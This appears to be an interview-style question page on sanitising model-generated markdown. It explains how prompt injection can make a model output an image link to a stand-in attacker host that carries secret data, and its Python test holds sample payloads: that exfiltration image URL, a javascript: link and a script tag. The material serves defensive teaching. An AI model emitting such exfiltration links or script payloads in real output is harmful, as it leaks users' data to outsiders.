# Q0150 · Sanitise model markdown before rendering

| Section | Topic | Difficulty |
|---|---|---|
| Prompting, Context Engineering & Structured Output | Output handling | Hard |

## Question

The UI renders model output as markdown. Write a sanitiser that escapes raw HTML, keeps links only to https allowlisted hosts, and removes images pointing elsewhere. Explain the image-based data-exfiltration attack it prevents.

## Answer

Attack: an injected instruction makes the model output `![x](https://attacker.example/p.png?d=<secret data>)`. When the browser renders the image, it silently sends the data to the attacker. Rendering untrusted HTML also enables XSS.

```python
import re
from urllib.parse import urlparse

LINK = re.compile(r'(!?)\[([^\]]*)\]\(([^)\s]+)(?:\s+"[^"]*")?\)')


def sanitize_markdown(md: str, allowed_hosts: set[str]) -> str:
    md = md.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    def repl(m: re.Match) -> str:
        bang, text, url = m.groups()
        u = urlparse(url)
        ok = u.scheme == "https" and u.hostname in allowed_hosts
        if ok:
            return m.group(0)
        return "[image removed]" if bang else text

    return LINK.sub(repl, md)


hosts = {"intranet.example.com"}
out = sanitize_markdown(
    "See [policy](https://intranet.example.com/travel) and [click](javascript:alert(1)).\n"
    "![chart](https://attacker.example/x.png?d=salary_data)\n<script>steal()</script>", hosts)
assert "[policy](https://intranet.example.com/travel)" in out
assert "javascript:" not in out and "click" in out
assert "attacker.example" not in out and "[image removed]" in out
assert "<script>" not in out and "&lt;script&gt;" in out
```

In production, render with a markdown library configured to disable raw HTML, then run a proven HTML sanitiser (for example DOMPurify on the client) with a URL allowlist. Add a Content Security Policy restricting image and connect sources as a backstop.

## Likely follow-ups

- Why is CSP an important second layer even with sanitisation?

---

[← Q0149](../../batch_02_prompting_context_structured_output/0149_snapshot_testing_rendered_prompts/README.md) · [Prompting, Context Engineering & Structured Output index](../README.md) · [All sections](../../README.md) · [Q0151 →](../../batch_02_prompting_context_structured_output/0151_coerce_and_validate_tool_arguments/README.md)
